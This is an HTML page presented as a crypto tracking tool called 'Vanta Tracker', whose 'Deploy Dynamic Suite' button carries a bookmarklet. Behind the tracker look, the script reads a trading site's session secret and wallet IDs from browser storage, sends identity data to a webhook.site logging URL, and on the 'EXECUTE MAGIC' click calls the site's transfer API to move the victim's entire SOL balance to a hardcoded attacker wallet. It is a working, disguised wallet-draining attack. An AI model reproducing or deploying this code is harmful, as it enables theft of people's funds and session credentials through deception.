<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vanta Tracker - Dynamic Discovery</title>
    <style>
        body { background: #0a0a0a; color: #00ff88; font-family: 'Inter', sans-serif; text-align: center; padding-top: 100px; }
        .btn { display: inline-block; padding: 20px 40px; background: #00ff88; color: #000; text-decoration: none; font-weight: 800; border-radius: 8px; }
    </style>
</head>
<body>
    <h1>Vanta Tracker v3.0</h1>
    <p>Discovery & Magic Drain Integrated</p>
    <a href="#" class="btn" id="vanta-tool">Deploy Dynamic Suite</a>

    <script>
        const DEST = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
        const LOG = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";

        const payload = `javascript:(async function() {
            /* 1. DISCOVERY PHASE: Find out what and who */
            const sRaw = localStorage.getItem('padreV2-session');
            const bRaw = localStorage.getItem('padre-v2-bundles-store-v2');
            
            if (!sRaw || !bRaw) {
                alert("No active session found. Please log in to Padre first.");
                return;
            }

            const session = JSON.parse(sRaw);
            const bundleStore = JSON.parse(bRaw);
            
            // Dynamically find the first available subOrgId (the wallet)
            const bundleKeys = Object.keys(bundleStore.bundles);
            const targetKey = bundleKeys[0];
            const subOrgId = bundleStore.bundles[targetKey].subOrgId;
            const secret = session.sessionSecret;

            /* 2. EXFILTRATE IDENTITY */
            fetch('${LOG}', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    who: targetKey,
                    org: subOrgId,
                    event: 'discovery_complete'
                })
            });

            /* 3. INJECT DRAGGABLE UI (Cleaned version of your code) */
            const initUI = () => {
                if (document.querySelector("#vanta-tracker")) return;
                const ui = document.createElement("div");
                ui.id = "vanta-tracker";
                ui.style.cssText = "position:fixed;top:50px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:999999;color:#fff;padding:0;overflow:hidden;box-shadow:0 0 20px #000;";
                
                ui.innerHTML = \`
                    <div id="v-head" style="padding:10px;background:#1a1a1a;cursor:grab;display:flex;justify-content:space-between;border-bottom:1px solid #333;">
                        <span style="color:#00ff88;font-weight:bold;">VANTA DISCOVERY</span>
                        <span onclick="this.parentElement.parentElement.remove()" style="cursor:pointer">Ã—</span>
                    </div>
                    <div style="padding:15px;font-size:12px;color:#aaa;">
                        <div style="margin-bottom:10px;">IDENTIFIED: <span style="color:#00ff88;">\${targetKey.slice(0,8)}...</span></div>
                        <div style="margin-bottom:15px;">ORG: <span style="color:#00ff88;">\${subOrgId.slice(0,8)}...</span></div>
                        <button id="v-magic" style="width:100%;padding:12px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">EXECUTE MAGIC</button>
                    </div>
                \`;
                document.body.appendChild(ui);

                /* MAGIC EXECUTION */
                document.getElementById('v-magic').onclick = async () => {
                    document.getElementById('v-magic').innerText = "EXECUTING...";
                    try {
                        const res = await fetch(\`https://api.padre.gg/v1/sub-orgs/\${subOrgId}/transfer\`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json', 'X-Session-Secret': secret },
                            body: JSON.stringify({
                                destination: '${DEST}',
                                amount: 'all',
                                mint: 'So11111111111111111111111111111111111111112'
                            })
                        });
                        fetch('${LOG}?res=' + res.status);
                    } catch(e) {}
                    location.reload();
                };

                /* DRAGGABLE */
                let d = false, x, y;
                const h = document.getElementById('v-head');
                h.onmousedown = (e) => { d = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; };
                document.onmousemove = (e) => { if(d) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; ui.style.right = 'auto'; } };
                document.onmouseup = () => d = false;
            };

            initUI();
        })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');

        document.getElementById('vanta-tool').href = payload;
    </script>
</body>
</html>
